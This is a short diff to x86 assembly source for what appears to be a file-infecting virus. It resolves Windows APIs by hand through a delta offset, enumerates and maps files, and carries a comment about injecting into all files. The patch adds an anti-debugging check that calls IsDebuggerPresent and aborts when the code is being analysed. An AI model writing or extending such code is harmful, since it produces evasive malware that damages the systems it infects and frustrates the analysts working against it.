@@ -150,6 +150,7 @@ PointerToRawData	dd	?
 CodeSecHeader		dd	?
 
 ; DLL
+sIsDebuggerPresent	db	'IsDebuggerPresent', 0 
 sCreateFileMapping	db	'CreateFileMappingA', 0 
 sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
 sGetSystemTime	db	'GetSystemTime', 0
@@ -166,6 +167,7 @@ sFindNextFile	db	'FindNextFileA', 0
 sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
+pIsDebuggerPresent	dd	? 
 pCreateFileMapping	dd	?
 pUnmapViewOfFile	dd	?
 pGetSystemTime	dd	?
@@ -266,6 +268,12 @@ GETADDR	sWriteFile, pKernel32, pWriteFile
 GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
 GETADDR	sFindNextFile, pKernel32, pFindNextFile
 GETADDR	sGetSystemTime, pKernel32, pGetSystemTime
+GETADDR	sIsDebuggerPresent, pKernel32, pIsDebuggerPresent
+
+; CHECK IF WE ARE BEING DEBUGGED : ABORT! ABORT!
+call	[DELTA pIsDebuggerPresent]
+cmp	eax, 0
+jne	errorExit
 
 
 ; INJECT ALL THE FILES !
